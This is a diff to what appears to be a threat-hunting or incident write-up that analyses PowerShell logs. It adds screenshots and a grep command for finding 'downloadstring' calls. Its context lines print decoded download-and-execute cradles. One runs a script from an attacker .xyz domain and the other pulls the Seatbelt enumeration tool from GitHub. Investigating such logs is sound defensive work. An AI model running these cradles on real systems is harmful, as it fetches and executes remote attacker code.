@@ -217,6 +217,10 @@ aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkA
 
 Decoded payload:
 
+<img width="1452" height="1119" alt="Screenshot 2026-10-01 at 16 12 33" src="https://github.com/user-attachments/assets/8e8f89f0-4ddf-401f-b482-1a56d97282f9" />
+
+<img width="1451" height="1145" alt="Screenshot 2026-10-01 at 16 11 54" src="https://github.com/user-attachments/assets/bcf1a873-aa56-49a9-9be5-7892244155c4" />
+
 ```powershell
 iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
 ```
@@ -263,6 +267,9 @@ cat powershell.json | jq '.ScriptBlockText' | grep '.xyz'
 
 ### Evidence
 
+<img width="1843" height="367" alt="Screenshot 2026-10-01 at 16 04 52" src="https://github.com/user-attachments/assets/c3643859-0610-4fce-b154-c7d585b899d0" />
+
+
 File-hosting infrastructure:
 
 ```text
@@ -293,7 +300,16 @@ cdn.bpakcaging.xyz,files.bpakcaging.xyz
 
 I reviewed PowerShell download commands and identified a known post-exploitation enumeration tool.
 
+```bash
+cat powershell.json | jq '.ScriptBlockText' | grep 'downloadstring'
+```
+
 ### Evidence
+
+
+<img width="1386" height="238" alt="Screenshot 2026-10-01 at 16 17 50" src="https://github.com/user-attachments/assets/e52ceb01-0c06-4006-a976-d4f816d61b82" />
+
+
 
 ```powershell
 iex(new-object net.webclient).downloadstring('[https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1)')
